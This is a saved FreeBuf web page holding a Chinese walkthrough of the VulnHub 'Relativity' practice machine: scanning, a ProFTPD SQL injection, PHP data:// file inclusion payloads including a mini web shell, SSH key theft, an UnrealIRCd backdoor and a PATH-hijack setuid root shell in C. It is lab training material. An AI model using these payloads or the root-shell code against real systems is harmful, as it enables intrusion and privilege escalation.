@@ -1,0 +1,409 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h1>下载地址</h1>
+<pre>https://download.vulnhub.com/devrandom/relativity_1.0.1.zip
+</pre>
+<h1><b>实战演练</b></h1>
+<p>使用netdiscover命令查找靶机的IP</p>
+<p><img alt="image.png" data-original="images/20190804/1564883177_5d4638e99b565.png" src="images/20190804/1564883177_5d4638e99b565.png" width="943" height="300" />使用nmap查看靶机开放的端口</p>
+<noscript><img alt="image.png" src="images/20190804/1564883177_5d4638e99b565.png" width="943" height="300" />使用nmap查看靶机开放的端口</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564883389_5d4639bd18c58.png" src="images/20190804/1564883389_5d4639bd18c58.png" width="928" height="361" />打开浏览器</p>
+<noscript><img alt="image.png" src="images/20190804/1564883389_5d4639bd18c58.png" width="928" height="361" />打开浏览器</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564883480_5d463a187c287.png" src="images/20190804/1564883480_5d463a187c287.png" width="1200" height="926" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564883480_5d463a187c287.png" width="1200" height="926" /></p></noscript>
+<p>爆破目录，没找到什么<br /><img alt="image.png" data-original="images/20190804/1564883613_5d463a9d051c4.png" src="images/20190804/1564883613_5d463a9d051c4.png" width="684" height="481" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564883613_5d463a9d051c4.png" width="684" height="481" /></p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564883791_5d463b4fc54d1.png" src="images/20190804/1564883791_5d463b4fc54d1.png" width="1200" height="416" /><br />FTP登录试试</p>
+<noscript><img alt="image.png" src="images/20190804/1564883791_5d463b4fc54d1.png" width="1200" height="416" /><br />FTP登录试试</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564883861_5d463b95b9868.png" src="images/20190804/1564883861_5d463b95b9868.png" width="603" height="302" />使用anonymous登录失败，不过我注意到一个banner</p>
+<noscript><img alt="image.png" src="images/20190804/1564883861_5d463b95b9868.png" width="603" height="302" />使用anonymous登录失败，不过我注意到一个banner</p></noscript>
+<p><span style="color:rgb(147,161,161);"><code>220 Welcome to Relativity FTP (mod_sql)</code></span></p>
+<p>google一下，找到一个<a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">SQL注入漏洞</a>，EXP在<a href="https://www.securityfocus.com/bid/33722/exploit">这里</a></p>
+<p>成功进去了，这个目录就是http服务器的目录</p>
+<p><img alt="image.png" data-original="images/20190804/1564884998_5d464006ca1da.png" src="images/20190804/1564884998_5d464006ca1da.png" width="994" height="375" />在浏览器打开这个目录</p>
+<noscript><img alt="image.png" src="images/20190804/1564884998_5d464006ca1da.png" width="994" height="375" />在浏览器打开这个目录</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564885043_5d4640339f294.png" src="images/20190804/1564885043_5d4640339f294.png" width="1200" height="593" />查看页面源代码，好像有文件包含漏洞</p>
+<noscript><img alt="image.png" src="images/20190804/1564885043_5d4640339f294.png" width="1200" height="593" />查看页面源代码，好像有文件包含漏洞</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564886655_5d46467f43ab8.png" src="images/20190804/1564886655_5d46467f43ab8.png" width="1200" height="658" />我尝试了一些本地文件包含，但它没有让我任何地方。为了进入下一步，我需要一些外部阅读和灵感。对于漏洞利用，我们可以利用PHP的流包装器：PHP附带了许多用于各种URL样式协议的内置包装器，用于文件系统函数，如fopen（），copy（），file_exists（）和filesize（），这里面有篇<a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">文章</a>的攻击应用</p>
+<noscript><img alt="image.png" src="images/20190804/1564886655_5d46467f43ab8.png" width="1200" height="658" />我尝试了一些本地文件包含，但它没有让我任何地方。为了进入下一步，我需要一些外部阅读和灵感。对于漏洞利用，我们可以利用PHP的流包装器：PHP附带了许多用于各种URL样式协议的内置包装器，用于文件系统函数，如fopen（），copy（），file_exists（）和filesize（），这里面有篇<a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">文章</a>的攻击应用</p></noscript>
+<pre># simple RFI
+page=data://text/plain, &lt;?php system("whoami");?&gt;
+
+# base64 encoded RFI
+page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==
+
+# mini shell
+page=data://text/plain,&lt;?php system($_GET[cmd]);?&gt;&amp;cmd=id
+
+# base64 + URL encoded mini shell (didn't work without URL encoding)
+page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id</pre>
+<p>执行成功</p>
+<p><img alt="image.png" data-original="images/20190804/1564886895_5d46476f9933d.png" src="images/20190804/1564886895_5d46476f9933d.png" width="1200" height="597" />查看passwd文件</p>
+<noscript><img alt="image.png" src="images/20190804/1564886895_5d46476f9933d.png" width="1200" height="597" />查看passwd文件</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564886928_5d4647900789a.png" src="images/20190804/1564886928_5d4647900789a.png" width="690" height="260" />查看home目录下</p>
+<noscript><img alt="image.png" src="images/20190804/1564886928_5d4647900789a.png" width="690" height="260" />查看home目录下</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564887051_5d46480bd2086.png" src="images/20190804/1564887051_5d46480bd2086.png" width="1200" height="725" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564887051_5d46480bd2086.png" width="1200" height="725" /></p></noscript>
+<p>这个目录没东西<br /><img alt="image.png" data-original="images/20190804/1564887092_5d4648342bf27.png" src="images/20190804/1564887092_5d4648342bf27.png" width="1200" height="636" />mauk目录有个.SSH文件夹</p>
+<noscript><img alt="image.png" src="images/20190804/1564887092_5d4648342bf27.png" width="1200" height="636" />mauk目录有个.SSH文件夹</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564887150_5d46486e21868.png" src="images/20190804/1564887150_5d46486e21868.png" width="1200" height="802" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564887150_5d46486e21868.png" width="1200" height="802" /></p></noscript>
+<p>进入可以看到有个公钥和私钥<br /><img alt="image.png" data-original="images/20190804/1564887170_5d4648828d91f.png" src="images/20190804/1564887170_5d4648828d91f.png" width="1200" height="737" />私钥</p>
+<noscript><img alt="image.png" src="images/20190804/1564887170_5d4648828d91f.png" width="1200" height="737" />私钥</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564887215_5d4648af34604.png" src="images/20190804/1564887215_5d4648af34604.png" width="1200" height="773" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564887215_5d4648af34604.png" width="1200" height="773" /></p></noscript>
+<p>使用私钥登录mauk账号</p>
+<p><img alt="image.png" data-original="images/20190804/1564887400_5d46496846d9c.png" src="images/20190804/1564887400_5d46496846d9c.png" width="790" height="302" />找到/opt下有个东西</p>
+<noscript><img alt="image.png" src="images/20190804/1564887400_5d46496846d9c.png" width="790" height="302" />找到/opt下有个东西</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564887687_5d464a87d5889.png" src="images/20190804/1564887687_5d464a87d5889.png" width="743" height="314" />查看端口开放情况</p>
+<noscript><img alt="image.png" src="images/20190804/1564887687_5d464a87d5889.png" width="743" height="314" />查看端口开放情况</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564887805_5d464afd71d72.png" src="images/20190804/1564887805_5d464afd71d72.png" width="690" height="238" />本地开放了6667端口</p>
+<noscript><img alt="image.png" src="images/20190804/1564887805_5d464afd71d72.png" width="690" height="238" />本地开放了6667端口</p></noscript>
+<pre>IRC（Internet Relay Chat的缩写，“因特网中继聊天”）是一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。IRC使用的服务器端口有6667（明文传输，如irc://irc.freenode.net）、6697（SSL加密传输，如ircs://irc.freenode.net:6697）等。</pre>
+<p>靶机上面没有nc命令，不能做端口转发，那就用SSH做端口转发</p>
+<p><img alt="image.png" data-original="images/20190804/1564887931_5d464b7bbf4dd.png" src="images/20190804/1564887931_5d464b7bbf4dd.png" width="690" height="87" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564887931_5d464b7bbf4dd.png" width="690" height="87" /></p></noscript>
+<p>kali扫描本地4444端口<br /><img alt="image.png" data-original="images/20190804/1564888052_5d464bf407bac.png" src="images/20190804/1564888052_5d464bf407bac.png" width="1200" height="527" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564888052_5d464bf407bac.png" width="1200" height="527" /></p></noscript>
+<p>这个版本存在一个后门漏洞，具体看<a href="https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">这里</a></p>
+<p>端口占用了，改一下ssh转发的端口</p>
+<p><img alt="image.png" src="images/20190804/1564888373_5d464d356fbef.png" width="1200" height="562" /><img alt="image.png" data-original="images/20190804/1564888609_5d464e213ab34.png" src="images/20190804/1564888609_5d464e213ab34.png" width="690" height="103" />这个exp好像不行，换另外一种方法</p>
+<noscript><img alt="image.png" src="images/20190804/1564888373_5d464d356fbef.png" width="1200" height="562" /><img alt="image.png" src="images/20190804/1564888609_5d464e213ab34.png" width="690" height="103" />这个exp好像不行，换另外一种方法</p></noscript>
+<p>测试能不能生成1文件</p>
+<p><img alt="image.png" src="images/20190804/1564889526_5d4651b60be80.png" width="865" height="112" /><img alt="image.png" data-original="images/20190804/1564889561_5d4651d9d3512.png" src="images/20190804/1564889561_5d4651d9d3512.png" width="1200" height="98" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564889526_5d4651b60be80.png" width="865" height="112" /><img alt="image.png" src="images/20190804/1564889561_5d4651d9d3512.png" width="1200" height="98" /></p></noscript>
+<p>nc监听<br /><img alt="image.png" data-original="images/20190804/1564889855_5d4652ff662f1.png" src="images/20190804/1564889855_5d4652ff662f1.png" width="567" height="312" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564889855_5d4652ff662f1.png" width="567" height="312" /></p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564889833_5d4652e9e9241.png" src="images/20190804/1564889833_5d4652e9e9241.png" width="904" height="138" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564889833_5d4652e9e9241.png" width="904" height="138" /></p></noscript>
+<p>看看怎么提权</p>
+<p><img alt="image.png" data-original="images/20190804/1564890056_5d4653c8a0b7d.png" src="images/20190804/1564890056_5d4653c8a0b7d.png" width="714" height="245" /><br />运行这个程序，发现字符串不断变化</p>
+<noscript><img alt="image.png" src="images/20190804/1564890056_5d4653c8a0b7d.png" width="714" height="245" /><br />运行这个程序，发现字符串不断变化</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564890221_5d46546d6865b.png" src="images/20190804/1564890221_5d46546d6865b.png" width="1150" height="941" />查看这个程序的信息。<code>fortune</code>不是从它的完整相对路径调用，但/usr/bin/cowsay是。这意味着，如果我可以欺骗二进制文件，让其他人知道这个<code>fortune</code>命令，那么我就可以根据这个框进行操作。特别是如果我能让它认为我的bash shell是<code>fortune</code></p>
+<noscript><img alt="image.png" src="images/20190804/1564890221_5d46546d6865b.png" width="1150" height="941" />查看这个程序的信息。<code>fortune</code>不是从它的完整相对路径调用，但/usr/bin/cowsay是。这意味着，如果我可以欺骗二进制文件，让其他人知道这个<code>fortune</code>命令，那么我就可以根据这个框进行操作。特别是如果我能让它认为我的bash shell是<code>fortune</code></p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564890332_5d4654dc8f629.png" src="images/20190804/1564890332_5d4654dc8f629.png" width="1033" height="492" />这个可以利用这个机制进行搞事</p>
+<noscript><img alt="image.png" src="images/20190804/1564890332_5d4654dc8f629.png" width="1033" height="492" />这个可以利用这个机制进行搞事</p></noscript>
+<pre class="selected">#root.c
+int main()
+{
+  setreuid(0,0,0);
+  setregid(0,0,0);
+  system("/bin/bash");
+  return 0;
+}
+
+#fortune.c
+
+int main()
+{
+  system("chown root:root /tmp/root; chmod +s,a+rwx /tmp/root");
+  return 0;
+}
+</pre>
+<p><img alt="image.png" data-original="images/20190804/1564891121_5d4657f1b55d0.png" src="images/20190804/1564891121_5d4657f1b55d0.png" width="706" height="391" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564891121_5d4657f1b55d0.png" width="706" height="391" /></p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564891286_5d46589668ddd.png" src="images/20190804/1564891286_5d46589668ddd.png" width="830" height="278" />修改环境变量</p>
+<noscript><img alt="image.png" src="images/20190804/1564891286_5d46589668ddd.png" width="830" height="278" />修改环境变量</p></noscript>
+<pre>export PATH="/tmp:$PATH"
+</pre>
+<p><img alt="image.png" data-original="images/20190804/1564892162_5d465c02e0b7f.png" src="images/20190804/1564892162_5d465c02e0b7f.png" width="916" height="762" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564892162_5d465c02e0b7f.png" width="916" height="762" /></p></noscript>
+<p></p>
+<p><b>=-=好像是因为终端shell的问题，一直不行</b></p>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="210311" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
